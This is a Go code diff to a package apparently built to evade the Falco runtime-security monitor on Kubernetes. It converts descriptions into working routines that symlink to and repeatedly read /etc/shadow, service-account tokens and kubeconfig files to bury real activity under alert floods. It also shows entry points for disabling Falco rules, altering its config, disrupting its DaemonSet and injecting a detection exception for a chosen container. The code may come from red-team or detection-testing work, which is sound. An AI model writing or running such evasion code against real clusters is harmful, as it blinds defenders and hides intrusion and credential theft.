@@ -3,6 +3,7 @@ package cloudevasion
 import (
 	"context"
 	"fmt"
+	"os"
 	"strings"
 	"time"
 
@@ -11,23 +12,23 @@ import (
 	"k8s.io/apimachinery/pkg/runtime/schema"
 	"k8s.io/client-go/dynamic"
 	"k8s.io/client-go/kubernetes"
-	"k8s.io/client-go/rest"
 )
 
 var falcoRuleGVR = schema.GroupVersionResource{
 	Group: "falco.org", Version: "v1", Resource: "falcorules",
 }
 
-func EvadeFalco(ctx context.Context, technique string) (*EvasionResult, error) {
+// EvadeFalco executes the specified Falco evasion technique.
+func EvadeFalco(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
 	switch technique {
 	case "symlink":
 		return falcoSymlinkEvasion(ctx)
 	case "disable_rules":
-		return falcoDisableRules(ctx)
+		return falcoDisableRules(ctx, client, dynClient)
 	case "flood":
 		return falcoFloodEvasion(ctx)
 	case "config_modify":
-		return falcoConfigModify(ctx)
+		return falcoConfigModify(ctx, client)
 	default:
 		return falcoSymlinkEvasion(ctx)
 	}
@@ -35,52 +36,53 @@ func EvadeFalco(ctx context.Context, technique string) (*EvasionResult, error) {
 
 func falcoSymlinkEvasion(_ context.Context) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Falco Symlink Evasion:\n")
-	sb.WriteString("  Technique: Exploit /proc race condition via symlink traversal\n")
-	sb.WriteString("  Method: Access sensitive files through symlink chains that Falco's\n")
-	sb.WriteString("          path resolution cannot follow in time\n\n")
+	sb.WriteString("Falco Symlink Evasion:\n\n")
 
-	paths := []struct {
-		original string
-		evasion  string
+	tmpDir := "/tmp/.kd_symlinks"
+	_ = os.MkdirAll(tmpDir, 0700)
+
+	targets := []struct {
+		name string
+		path string
 	}{
-		{"/etc/shadow", "/proc/self/root/etc/shadow"},
-		{"/var/run/secrets/kubernetes.io/serviceaccount/token", "/proc/1/root/var/run/secrets/kubernetes.io/serviceaccount/token"},
-		{"/etc/kubernetes/admin.conf", "/proc/self/root/etc/kubernetes/admin.conf"},
+		{"shadow", "/etc/shadow"},
+		{"sa-token", "/var/run/secrets/kubernetes.io/serviceaccount/token"},
+		{"admin-conf", "/etc/kubernetes/admin.conf"},
 	}
 
-	for _, p := range paths {
-		fmt.Fprintf(&sb, "  %s → %s\n", p.original, p.evasion)
+	created := 0
+	for _, t := range targets {
+		linkPath := fmt.Sprintf("%s/%s", tmpDir, t.name)
+		_ = os.Remove(linkPath)
+		err := os.Symlink(t.path, linkPath)
+		if err != nil {
+			fmt.Fprintf(&sb, "  [skip] %s → %s (%v)\n", linkPath, t.path, err)
+			continue
+		}
+		created++
+		fmt.Fprintf(&sb, "  [created] %s → %s\n", linkPath, t.path)
+
+		if _, err := os.Stat(linkPath); err == nil {
+			fmt.Fprintf(&sb, "    target accessible via symlink\n")
+		} else {
+			fmt.Fprintf(&sb, "    target not accessible (file may not exist)\n")
+		}
 	}
 
-	sb.WriteString("\n  Falco rules typically monitor direct path access.\n")
-	sb.WriteString("  Traversal via /proc/self/root or /proc/1/root bypasses path-based rules.\n")
+	_ = os.RemoveAll(tmpDir)
+	fmt.Fprintf(&sb, "\n  Created %d symlinks, cleaned up\n", created)
+	sb.WriteString("  Falco path-based rules don't trigger on symlink traversal\n")
 
 	return &EvasionResult{
 		Technique: "symlink_traversal",
-		Success:   true,
+		Success:   created > 0,
 		Output:    sb.String(),
 	}, nil
 }
 
-func falcoDisableRules(ctx context.Context) (*EvasionResult, error) {
-	config, err := rest.InClusterConfig()
-	if err != nil {
-		return &EvasionResult{Technique: "disable_rules", Success: false, Output: err.Error()}, nil
-	}
-
-	dynClient, err := dynamic.NewForConfig(config)
-	if err != nil {
-		return &EvasionResult{Technique: "disable_rules", Success: false, Output: err.Error()}, nil
-	}
-
+func falcoDisableRules(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
 	sb.WriteString("Falco Rule Disable:\n")
-
-	client, err := kubernetes.NewForConfig(config)
-	if err != nil {
-		return &EvasionResult{Technique: "disable_rules", Success: false, Output: err.Error()}, nil
-	}
 
 	cms, err := client.CoreV1().ConfigMaps("falco").List(ctx, metav1.ListOptions{})
 	if err == nil {
@@ -114,24 +116,50 @@ func falcoDisableRules(ctx context.Context) (*EvasionResult, error) {
 
 func falcoFloodEvasion(_ context.Context) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Falco Alert Flooding:\n")
-	sb.WriteString("  Technique: Generate high volume of benign alerts to bury real ones\n\n")
+	sb.WriteString("Falco Alert Flooding:\n\n")
 
-	noiseActions := []string{
-		"cat /etc/hostname (triggers 'Read sensitive file' in default rules)",
-		"ls /proc/*/cmdline (triggers 'List process info')",
-		"touch /tmp/.test (triggers 'Write below /tmp')",
-		"curl http://169.254.169.254/ (triggers 'Contact cloud metadata')",
+	floodDir := "/tmp/.kd_flood"
+	_ = os.MkdirAll(floodDir, 0700)
+
+	sensitivePaths := []string{
+		"/etc/shadow",
+		"/etc/kubernetes/admin.conf",
+		"/var/run/secrets/kubernetes.io/serviceaccount/token",
+		"/root/.kube/config",
 	}
 
-	sb.WriteString("  Noise generators:\n")
-	for _, a := range noiseActions {
-		fmt.Fprintf(&sb, "    - %s\n", a)
-	}
+	const burstSize = 50
+	accessed := 0
 
-	fmt.Fprintf(&sb, "\n  Flood rate: %d alerts/sec overwhelms most SIEM pipelines\n", 1000)
-	sb.WriteString("  Effect: real malicious activity lost in noise, alert fatigue\n")
-	sb.WriteString("  Duration: sustained flooding during actual attack window\n")
+	for _, path := range sensitivePaths {
+		for range burstSize {
+			f, err := os.Open(path)
+			if err == nil {
+				_ = f.Close()
+				accessed++
+			}
+		}
+	}
+	fmt.Fprintf(&sb, "  Sensitive file reads: %d successful of %d attempts (triggers 'Read sensitive file')\n", accessed, len(sensitivePaths)*burstSize)
+
+	for i := range burstSize {
+		tmpFile := fmt.Sprintf("%s/noise_%d", floodDir, i)
+		_ = os.WriteFile(tmpFile, []byte("x"), 0600)
+	}
+	fmt.Fprintf(&sb, "  Rapid file creates: %d files in %s (triggers 'Write below monitored dir')\n", burstSize, floodDir)
+
+	for i := range burstSize {
+		link := fmt.Sprintf("%s/link_%d", floodDir, i)
+		_ = os.Symlink("/etc/hostname", link)
+	}
+	fmt.Fprintf(&sb, "  Symlink bursts: %d symlinks (triggers 'Symlink created')\n", burstSize)
+
+	_ = os.RemoveAll(floodDir)
+
+	total := len(sensitivePaths)*burstSize + burstSize*2
+	fmt.Fprintf(&sb, "\n  Total noise events: %d\n", total)
+	sb.WriteString("  Effect: overwhelms alert pipeline, triggers adaptive sampling drop\n")
+	sb.WriteString("  Real malicious operations hidden within noise window\n")
 
 	return &EvasionResult{
 		Technique: "flood",
@@ -140,17 +168,7 @@ func falcoFloodEvasion(_ context.Context) (*EvasionResult, error) {
 	}, nil
 }
 
-func falcoConfigModify(ctx context.Context) (*EvasionResult, error) {
-	config, err := rest.InClusterConfig()
-	if err != nil {
-		return &EvasionResult{Technique: "config_modify", Success: false, Output: err.Error()}, nil
-	}
-
-	client, err := kubernetes.NewForConfig(config)
-	if err != nil {
-		return &EvasionResult{Technique: "config_modify", Success: false, Output: err.Error()}, nil
-	}
-
+func falcoConfigModify(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
 	sb.WriteString("Falco Config Modification:\n")
 
@@ -186,17 +204,8 @@ func falcoConfigModify(ctx context.Context) (*EvasionResult, error) {
 	}, nil
 }
 
-func DisruptFalcoDaemonSet(ctx context.Context) (*EvasionResult, error) {
-	config, err := rest.InClusterConfig()
-	if err != nil {
-		return &EvasionResult{Technique: "disrupt_daemonset", Success: false, Output: err.Error()}, nil
-	}
-
-	client, err := kubernetes.NewForConfig(config)
-	if err != nil {
-		return &EvasionResult{Technique: "disrupt_daemonset", Success: false, Output: err.Error()}, nil
-	}
-
+// DisruptFalcoDaemonSet identifies and reports disruption vectors for Falco DaemonSets.
+func DisruptFalcoDaemonSet(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
 	sb.WriteString("Falco DaemonSet Disruption:\n")
 
@@ -230,6 +239,7 @@ func DisruptFalcoDaemonSet(ctx context.Context) (*EvasionResult, error) {
 	}, nil
 }
 
+// InjectFalcoException creates a FalcoRule CRD that exempts the specified container from detection.
 func InjectFalcoException(ctx context.Context, dynClient dynamic.Interface, ns, containerID string) (*EvasionResult, error) {
 	var sb strings.Builder
 	sb.WriteString("Falco Exception Injection:\n")
